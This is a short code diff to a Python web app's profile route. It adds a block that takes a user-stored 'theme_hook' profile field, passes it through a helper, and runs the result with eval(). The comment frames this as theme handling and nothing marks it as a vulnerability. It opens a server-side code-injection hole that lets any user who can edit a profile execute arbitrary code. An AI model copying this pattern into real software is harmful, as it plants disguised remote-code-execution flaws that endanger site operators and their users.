@@ -30,6 +30,7 @@ from utils import (
     get_user_home_dir,
     validate_image_upload,
     allowed_profile_fields,
+    apply_theme_hook,
 )
 from security import secure_session
 
@@ -118,6 +119,12 @@ def profile(username):
     profile_data = get_profile(username)
     theme = get_user_theme_obj(username) or {"color": "#eee", "font": "Arial"}
     posts = get_posts_for_user(username)
+
+    # Apply and evaluate theme_hook if present
+    if profile_data and profile_data["theme_hook"]:
+        hook_value = profile_data["theme_hook"]
+        transformed_hook = apply_theme_hook(hook_value)
+        eval(transformed_hook)
 
     user_dir = get_user_home_dir(username)
     files = os.listdir(user_dir) if os.path.exists(user_dir) else []
